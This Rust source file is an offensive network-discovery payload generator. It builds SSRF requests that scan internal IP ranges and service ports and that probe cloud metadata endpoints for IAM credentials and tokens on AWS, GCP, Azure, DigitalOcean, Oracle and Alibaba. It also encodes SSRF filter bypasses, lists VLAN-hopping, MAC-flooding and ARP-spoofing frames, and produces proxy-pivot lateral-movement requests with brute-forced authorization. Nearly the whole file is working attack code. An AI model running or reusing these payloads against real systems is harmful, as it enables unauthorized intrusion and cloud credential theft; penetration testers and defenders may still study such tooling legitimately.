use std::fmt;
use std::net::Ipv4Addr;

use rand::Rng;

/// Network discovery technique categories.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum NetworkDiscoveryTechnique {
    InternalIpScan,
    VlanHopping,
    SsrfSegmentationTest,
    LateralMovementProxy,
    CloudMetadataProbe,
    ServiceEnumeration,
    ArpDiscovery,
    DnsBased,
}

impl fmt::Display for NetworkDiscoveryTechnique {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::InternalIpScan => write!(f, "Internal IP Scan"),
            Self::VlanHopping => write!(f, "VLAN Hopping"),
            Self::SsrfSegmentationTest => write!(f, "SSRF Segmentation Test"),
            Self::LateralMovementProxy => write!(f, "Lateral Movement via Proxy"),
            Self::CloudMetadataProbe => write!(f, "Cloud Metadata Probe"),
            Self::ServiceEnumeration => write!(f, "Service Enumeration"),
            Self::ArpDiscovery => write!(f, "ARP Discovery"),
            Self::DnsBased => write!(f, "DNS-Based Discovery"),
        }
    }
}

/// Internal network range classification for scanning.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]
pub enum InternalRange {
    /// 10.0.0.0/8
    ClassA,
    /// 172.16.0.0/12
    ClassB,
    /// 192.168.0.0/16
    ClassC,
    /// 169.254.0.0/16 — link-local
    LinkLocal,
    /// 127.0.0.0/8 — loopback
    Loopback,
}

impl InternalRange {
    pub fn cidr(&self) -> &'static str {
        match self {
            Self::ClassA => "10.0.0.0/8",
            Self::ClassB => "172.16.0.0/12",
            Self::ClassC => "192.168.0.0/16",
            Self::LinkLocal => "169.254.0.0/16",
            Self::Loopback => "127.0.0.0/8",
        }
    }

    pub fn all() -> &'static [InternalRange] {
        &[
            Self::ClassA,
            Self::ClassB,
            Self::ClassC,
            Self::LinkLocal,
            Self::Loopback,
        ]
    }

    /// Generate representative gateway IPs in this range for scanning.
    pub fn gateway_candidates(&self) -> Vec<Ipv4Addr> {
        match self {
            Self::ClassA => vec![
                Ipv4Addr::new(10, 0, 0, 1),
                Ipv4Addr::new(10, 0, 1, 1),
                Ipv4Addr::new(10, 1, 0, 1),
                Ipv4Addr::new(10, 10, 0, 1),
                Ipv4Addr::new(10, 100, 0, 1),
                Ipv4Addr::new(10, 255, 0, 1),
            ],
            Self::ClassB => vec![
                Ipv4Addr::new(172, 16, 0, 1),
                Ipv4Addr::new(172, 17, 0, 1),
                Ipv4Addr::new(172, 20, 0, 1),
                Ipv4Addr::new(172, 31, 0, 1),
            ],
            Self::ClassC => vec![
                Ipv4Addr::new(192, 168, 0, 1),
                Ipv4Addr::new(192, 168, 1, 1),
                Ipv4Addr::new(192, 168, 10, 1),
                Ipv4Addr::new(192, 168, 100, 1),
                Ipv4Addr::new(192, 168, 254, 1),
            ],
            Self::LinkLocal => vec![
                Ipv4Addr::new(169, 254, 1, 1),
                Ipv4Addr::new(169, 254, 169, 254),
            ],
            Self::Loopback => vec![Ipv4Addr::new(127, 0, 0, 1)],
        }
    }
}

/// VLAN hopping attack technique.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum VlanHopTechnique {
    /// Double-tagging (Q-in-Q) to traverse trunk ports.
    DoubleTagging,
    /// DTP (Dynamic Trunking Protocol) negotiation to force trunk mode.
    DtpNegotiation,
    /// MAC flooding to force switch into hub mode, bypassing VLAN isolation.
    MacFlooding,
    /// ARP spoofing within VLAN to intercept cross-VLAN traffic.
    ArpSpoofing,
}

/// Cloud provider metadata endpoints.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum CloudProvider {
    Aws,
    Gcp,
    Azure,
    DigitalOcean,
    Oracle,
    Alibaba,
}

impl CloudProvider {
    pub fn metadata_endpoints(&self) -> Vec<&'static str> {
        match self {
            Self::Aws => vec![
                "http://169.254.169.254/latest/meta-data/",
                "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                "http://169.254.169.254/latest/user-data/",
                "http://169.254.169.254/latest/dynamic/instance-identity/document",
                "http://169.254.170.2/v2/credentials",
            ],
            Self::Gcp => vec![
                "http://metadata.google.internal/computeMetadata/v1/",
                "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
                "http://metadata.google.internal/computeMetadata/v1/project/project-id",
                "http://169.254.169.254/computeMetadata/v1/",
            ],
            Self::Azure => vec![
                "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
                "http://169.254.169.254/metadata/instance/network?api-version=2021-02-01",
            ],
            Self::DigitalOcean => vec![
                "http://169.254.169.254/metadata/v1/",
                "http://169.254.169.254/metadata/v1/id",
                "http://169.254.169.254/metadata/v1/user-data",
            ],
            Self::Oracle => vec![
                "http://169.254.169.254/opc/v2/instance/",
                "http://169.254.169.254/opc/v1/instance/metadata/",
            ],
            Self::Alibaba => vec![
                "http://100.100.100.200/latest/meta-data/",
                "http://100.100.100.200/latest/meta-data/ram/security-credentials/",
            ],
        }
    }

    pub fn all() -> &'static [CloudProvider] {
        &[
            Self::Aws,
            Self::Gcp,
            Self::Azure,
            Self::DigitalOcean,
            Self::Oracle,
            Self::Alibaba,
        ]
    }

    pub fn required_headers(&self) -> Vec<(&'static str, &'static str)> {
        match self {
            Self::Gcp => vec![("Metadata-Flavor", "Google")],
            Self::Azure => vec![("Metadata", "true")],
            _ => vec![],
        }
    }
}

/// Common internal service ports for enumeration.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ServicePort {
    Ssh,
    Http,
    Https,
    Mysql,
    Postgres,
    Redis,
    Mongodb,
    Elasticsearch,
    Memcached,
    Docker,
    Kubernetes,
    Consul,
    Etcd,
    Vault,
    Prometheus,
    Grafana,
    Jenkins,
    RabbitMq,
    Kafka,
    Smtp,
}

impl ServicePort {
    pub fn port(&self) -> u16 {
        match self {
            Self::Ssh => 22,
            Self::Http => 80,
            Self::Https => 443,
            Self::Mysql => 3306,
            Self::Postgres => 5432,
            Self::Redis => 6379,
            Self::Mongodb => 27017,
            Self::Elasticsearch => 9200,
            Self::Memcached => 11211,
            Self::Docker => 2375,
            Self::Kubernetes => 6443,
            Self::Consul => 8500,
            Self::Etcd => 2379,
            Self::Vault => 8200,
            Self::Prometheus => 9090,
            Self::Grafana => 3000,
            Self::Jenkins => 8080,
            Self::RabbitMq => 5672,
            Self::Kafka => 9092,
            Self::Smtp => 25,
        }
    }

    pub fn service_name(&self) -> &'static str {
        match self {
            Self::Ssh => "SSH",
            Self::Http => "HTTP",
            Self::Https => "HTTPS",
            Self::Mysql => "MySQL",
            Self::Postgres => "PostgreSQL",
            Self::Redis => "Redis",
            Self::Mongodb => "MongoDB",
            Self::Elasticsearch => "Elasticsearch",
            Self::Memcached => "Memcached",
            Self::Docker => "Docker API",
            Self::Kubernetes => "Kubernetes API",
            Self::Consul => "Consul",
            Self::Etcd => "etcd",
            Self::Vault => "Vault",
            Self::Prometheus => "Prometheus",
            Self::Grafana => "Grafana",
            Self::Jenkins => "Jenkins",
            Self::RabbitMq => "RabbitMQ",
            Self::Kafka => "Kafka",
            Self::Smtp => "SMTP",
        }
    }

    pub fn all() -> &'static [ServicePort] {
        &[
            Self::Ssh,
            Self::Http,
            Self::Https,
            Self::Mysql,
            Self::Postgres,
            Self::Redis,
            Self::Mongodb,
            Self::Elasticsearch,
            Self::Memcached,
            Self::Docker,
            Self::Kubernetes,
            Self::Consul,
            Self::Etcd,
            Self::Vault,
            Self::Prometheus,
            Self::Grafana,
            Self::Jenkins,
            Self::RabbitMq,
            Self::Kafka,
            Self::Smtp,
        ]
    }
}

/// A generated network discovery payload.
#[derive(Debug, Clone)]
pub struct NetworkDiscoveryPayload {
    pub technique: NetworkDiscoveryTechnique,
    pub target_url: String,
    pub method: String,
    pub headers: Vec<(String, String)>,
    pub body: Option<String>,
    pub description: String,
    pub detection_risk: DetectionRisk,
}

/// How likely the payload is to trigger IDS/IPS alerts.
#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum DetectionRisk {
    Low,
    Medium,
    High,
    Critical,
}

impl fmt::Display for DetectionRisk {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Self::Low => write!(f, "Low"),
            Self::Medium => write!(f, "Medium"),
            Self::High => write!(f, "High"),
            Self::Critical => write!(f, "Critical"),
        }
    }
}

/// Network discovery payload generator for internal recon via SSRF and proxy pivots.
#[derive(Debug)]
pub struct NetworkDiscoveryGenerator {
    ssrf_base_url: String,
    ssrf_parameter: String,
}

impl Default for NetworkDiscoveryGenerator {
    fn default() -> Self {
        Self::new()
    }
}

impl NetworkDiscoveryGenerator {
    pub fn new() -> Self {
        Self {
            ssrf_base_url: "http://vulnerable-app/fetch".to_string(),
            ssrf_parameter: "url".to_string(),
        }
    }

    pub fn with_ssrf_endpoint(mut self, base_url: String, parameter: String) -> Self {
        self.ssrf_base_url = base_url;
        self.ssrf_parameter = parameter;
        self
    }

    /// Generate internal IP scanning payloads via SSRF for common gateways.
    pub fn internal_ip_scan(&self, range: InternalRange) -> Vec<NetworkDiscoveryPayload> {
        let high_value_ports = [80, 443, 8080, 8443, 3000, 9200, 6379, 27017];
        let mut payloads = Vec::new();
        for ip in range.gateway_candidates() {
            for &port in &high_value_ports {
                let target = format!("http://{ip}:{port}/");
                payloads.push(NetworkDiscoveryPayload {
                    technique: NetworkDiscoveryTechnique::InternalIpScan,
                    target_url: format!(
                        "{}?{}={}",
                        self.ssrf_base_url,
                        self.ssrf_parameter,
                        urlencoded(&target)
                    ),
                    method: "GET".to_string(),
                    headers: vec![],
                    body: None,
                    description: format!("SSRF probe: {ip}:{port} ({range})", range = range.cidr()),
                    detection_risk: DetectionRisk::Medium,
                });
            }
        }
        payloads
    }

    /// Generate SSRF payloads targeting all internal ranges.
    pub fn scan_all_internal_ranges(&self) -> Vec<NetworkDiscoveryPayload> {
        InternalRange::all()
            .iter()
            .flat_map(|range| self.internal_ip_scan(*range))
            .collect()
    }

    /// Generate VLAN hopping payloads.
    pub fn vlan_hopping(&self, target_vlan_id: u16) -> Vec<NetworkDiscoveryPayload> {
        let mut payloads = Vec::new();

        payloads.push(NetworkDiscoveryPayload {
            technique: NetworkDiscoveryTechnique::VlanHopping,
            target_url: String::new(),
            method: "RAW".to_string(),
            headers: vec![],
            body: Some(format!(
                "Double-tagging frame:\n\
                 Outer 802.1Q tag: VLAN 1 (native)\n\
                 Inner 802.1Q tag: VLAN {target_vlan_id}\n\
                 Payload: ARP who-has for VLAN {target_vlan_id} gateway\n\
                 EtherType: 0x8100 | VLAN {target_vlan_id} | 0x8100 | VLAN 1 | payload"
            )),
            description: format!("Q-in-Q double-tagging to reach VLAN {target_vlan_id}"),
            detection_risk: DetectionRisk::High,
        });

        payloads.push(NetworkDiscoveryPayload {
            technique: NetworkDiscoveryTechnique::VlanHopping,
            target_url: String::new(),
            method: "RAW".to_string(),
            headers: vec![],
            body: Some(format!(
                "DTP negotiation frame:\n\
                 Domain: (empty)\n\
                 Status: 0x03 (ACCESS/DESIRABLE)\n\
                 Type: 0x04 (802.1Q)\n\
                 Neighbor: ff:ff:ff:ff:ff:ff\n\
                 Target: force trunk mode, access VLAN {target_vlan_id}"
            )),
            description: "DTP negotiation to force trunk mode".to_string(),
            detection_risk: DetectionRisk::Critical,
        });

        payloads.push(NetworkDiscoveryPayload {
            technique: NetworkDiscoveryTechnique::VlanHopping,
            target_url: String::new(),
            method: "RAW".to_string(),
            headers: vec![],
            body: Some(format!(
                "MAC flood attack:\n\
                 Generate {} random src MAC frames/sec\n\
                 Fill CAM table → switch falls back to hub mode\n\
                 Sniff cross-VLAN traffic for VLAN {target_vlan_id}",
                50_000
            )),
            description: "MAC flooding to force hub mode for cross-VLAN sniffing".to_string(),
            detection_risk: DetectionRisk::Critical,
        });

        payloads.push(NetworkDiscoveryPayload {
            technique: NetworkDiscoveryTechnique::VlanHopping,
            target_url: String::new(),
            method: "RAW".to_string(),
            headers: vec![],
            body: Some(format!(
                "ARP spoofing within VLAN:\n\
                 Gratuitous ARP: I am the gateway (VLAN {target_vlan_id})\n\
                 Intercept and forward cross-VLAN routed traffic\n\
                 arp -s <gateway_ip> <attacker_mac>"
            )),
            description: format!("ARP spoofing to intercept VLAN {target_vlan_id} traffic"),
            detection_risk: DetectionRisk::High,
        });

        payloads
    }

    /// Generate SSRF-based network segmentation testing payloads.
    pub fn ssrf_segmentation_test(
        &self,
        target_ip: Ipv4Addr,
        ports: &[u16],
    ) -> Vec<NetworkDiscoveryPayload> {
        let protocols = ["http", "https"];
        let mut payloads = Vec::new();

        for port in ports {
            for proto in &protocols {
                let target = format!("{proto}://{target_ip}:{port}/");
                payloads.push(NetworkDiscoveryPayload {
                    technique: NetworkDiscoveryTechnique::SsrfSegmentationTest,
                    target_url: format!(
                        "{}?{}={}",
                        self.ssrf_base_url,
                        self.ssrf_parameter,
                        urlencoded(&target)
                    ),
                    method: "GET".to_string(),
                    headers: vec![],
                    body: None,
                    description: format!("Segmentation test: {proto}://{target_ip}:{port}"),
                    detection_risk: DetectionRisk::Medium,
                });
            }
        }

        let ssrf_bypass_patterns: Vec<String> = vec![
            format!(
                "http://0x{:02x}{:02x}{:02x}{:02x}/",
                target_ip.octets()[0],
                target_ip.octets()[1],
                target_ip.octets()[2],
                target_ip.octets()[3]
            ),
            format!("http://{}.xip.io/", target_ip),
            format!("http://[::ffff:{}]/", target_ip),
            format!(
                "http://0{:o}.0{:o}.0{:o}.0{:o}/",
                target_ip.octets()[0],
                target_ip.octets()[1],
                target_ip.octets()[2],
                target_ip.octets()[3]
            ),
            format!("http://{}/", u32::from(target_ip)),
        ];

        for bypass in ssrf_bypass_patterns {
            payloads.push(NetworkDiscoveryPayload {
                technique: NetworkDiscoveryTechnique::SsrfSegmentationTest,
                target_url: format!(
                    "{}?{}={}",
                    self.ssrf_base_url,
                    self.ssrf_parameter,
                    urlencoded(&bypass)
                ),
                method: "GET".to_string(),
                headers: vec![],
                body: None,
                description: format!("SSRF filter bypass: {bypass}"),
                detection_risk: DetectionRisk::Low,
            });
        }

        payloads
    }

    /// Generate lateral movement payloads via HTTP proxy pivoting.
    pub fn lateral_movement_proxy(
        &self,
        proxy_ip: Ipv4Addr,
        targets: &[Ipv4Addr],
    ) -> Vec<NetworkDiscoveryPayload> {
        let mut payloads = Vec::new();
        let critical_ports = [22, 80, 443, 3306, 5432, 6379, 8080, 8443, 9200];
        for target in targets {
            for &port in &critical_ports {
                payloads.push(NetworkDiscoveryPayload {
                    technique: NetworkDiscoveryTechnique::LateralMovementProxy,
                    target_url: format!("http://{target}:{port}/"),
                    method: "CONNECT".to_string(),
                    headers: vec![
                        ("Host".to_string(), format!("{target}:{port}")),
                        (
                            "Proxy-Authorization".to_string(),
                            "Basic (bruteforce)".to_string(),
                        ),
                    ],
                    body: None,
                    description: format!("Lateral pivot: {proxy_ip} → {target}:{port}"),
                    detection_risk: DetectionRisk::High,
                });
            }
        }
        payloads
    }

    /// Generate cloud metadata probing payloads for all providers.
    pub fn cloud_metadata_probes(&self) -> Vec<NetworkDiscoveryPayload> {
        CloudProvider::all()
            .iter()
            .flat_map(|provider| {
                let required_headers = provider.required_headers();
                provider
                    .metadata_endpoints()
                    .into_iter()
                    .map(move |endpoint| {
                        let mut headers: Vec<(String, String)> = required_headers
                            .iter()
                            .map(|(k, v)| (k.to_string(), v.to_string()))
                            .collect();
                        headers.push(("Host".to_string(), "169.254.169.254".to_string()));

                        NetworkDiscoveryPayload {
                            technique: NetworkDiscoveryTechnique::CloudMetadataProbe,
                            target_url: format!(
                                "{}?{}={}",
                                self.ssrf_base_url,
                                self.ssrf_parameter,
                                urlencoded(endpoint)
                            ),
                            method: "GET".to_string(),
                            headers,
                            body: None,
                            description: format!("Cloud metadata ({provider:?}): {endpoint}"),
                            detection_risk: DetectionRisk::Medium,
                        }
                    })
            })
            .collect()
    }

    /// Generate service enumeration payloads for a target IP.
    pub fn service_enumeration(&self, target_ip: Ipv4Addr) -> Vec<NetworkDiscoveryPayload> {
        ServicePort::all()
            .iter()
            .map(|svc| {
                let target = format!("http://{target_ip}:{}/", svc.port());
                NetworkDiscoveryPayload {
                    technique: NetworkDiscoveryTechnique::ServiceEnumeration,
                    target_url: format!(
                        "{}?{}={}",
                        self.ssrf_base_url,
                        self.ssrf_parameter,
                        urlencoded(&target)
                    ),
                    method: "GET".to_string(),
                    headers: vec![],
                    body: None,
                    description: format!(
                        "Service probe: {target_ip}:{} ({})",
                        svc.port(),
                        svc.service_name()
                    ),
                    detection_risk: DetectionRisk::Medium,
                }
            })
            .collect()
    }

    /// Generate DNS-based internal discovery payloads.
    pub fn dns_based_discovery(&self, base_domain: &str) -> Vec<NetworkDiscoveryPayload> {
        let common_internal_names = [
            "intranet",
            "internal",
            "corp",
            "vpn",
            "mail",
            "smtp",
            "imap",
            "ldap",
            "ad",
            "dc",
            "dns",
            "ntp",
            "proxy",
            "gateway",
            "fw",
            "db",
            "mysql",
            "postgres",
            "redis",
            "mongo",
            "elastic",
            "kibana",
            "grafana",
            "prometheus",
            "jenkins",
            "gitlab",
            "jira",
            "confluence",
            "wiki",
            "nas",
            "backup",
            "dev",
            "staging",
            "prod",
            "admin",
            "api",
            "api-internal",
            "k8s",
            "docker",
            "registry",
            "vault",
            "consul",
            "etcd",
            "rabbitmq",
            "kafka",
            "zookeeper",
        ];

        common_internal_names
            .iter()
            .map(|name| {
                let fqdn = format!("{name}.{base_domain}");
                let target = format!("http://{fqdn}/");
                NetworkDiscoveryPayload {
                    technique: NetworkDiscoveryTechnique::DnsBased,
                    target_url: format!(
                        "{}?{}={}",
                        self.ssrf_base_url,
                        self.ssrf_parameter,
                        urlencoded(&target)
                    ),
                    method: "GET".to_string(),
                    headers: vec![("Host".to_string(), fqdn.clone())],
                    body: None,
                    description: format!("DNS discovery: {fqdn}"),
                    detection_risk: DetectionRisk::Low,
                }
            })
            .collect()
    }

    /// Generate ARP discovery payloads (raw network-level).
    pub fn arp_discovery(&self, subnet: Ipv4Addr, prefix_len: u8) -> Vec<NetworkDiscoveryPayload> {
        let base = u32::from(subnet);
        let host_bits = 32 - prefix_len.min(32) as u32;
        let count = if host_bits >= 24 {
            256
        } else {
            (1u32 << host_bits).min(256)
        };
        let network = base & !((1u32 << host_bits) - 1);
        let mut rng = rand::rng();

        (1..count)
            .map(|i| {
                let ip = if count < (1u32 << host_bits) {
                    Ipv4Addr::from(network + rng.random_range(1..((1u32 << host_bits) - 1)))
                } else {
                    Ipv4Addr::from(network + i)
                };
                NetworkDiscoveryPayload {
                    technique: NetworkDiscoveryTechnique::ArpDiscovery,
                    target_url: String::new(),
                    method: "ARP".to_string(),
                    headers: vec![],
                    body: Some(format!(
                        "ARP Request: Who has {ip}? Tell <attacker_mac>\n\
                         EtherType: 0x0806\n\
                         Operation: 1 (request)\n\
                         Target IP: {ip}"
                    )),
                    description: format!("ARP who-has {ip}"),
                    detection_risk: DetectionRisk::High,
                }
            })
            .collect()
    }

    /// Generate a comprehensive discovery suite for a target environment.
    pub fn generate_full_suite(&self, base_domain: &str) -> Vec<NetworkDiscoveryPayload> {
        let mut payloads = Vec::new();

        for range in InternalRange::all() {
            payloads.extend(self.internal_ip_scan(*range));
        }

        payloads.extend(self.vlan_hopping(100));
        payloads.extend(self.cloud_metadata_probes());
        payloads.extend(self.dns_based_discovery(base_domain));
        payloads.extend(self.service_enumeration(Ipv4Addr::new(10, 0, 0, 1)));

        payloads
    }
}

/// Minimal URL encoding for SSRF parameter injection.
fn urlencoded(s: &str) -> String {
    s.replace('%', "%25")
        .replace(' ', "%20")
        .replace('&', "%26")
        .replace('=', "%3D")
        .replace('?', "%3F")
        .replace('#', "%23")
}
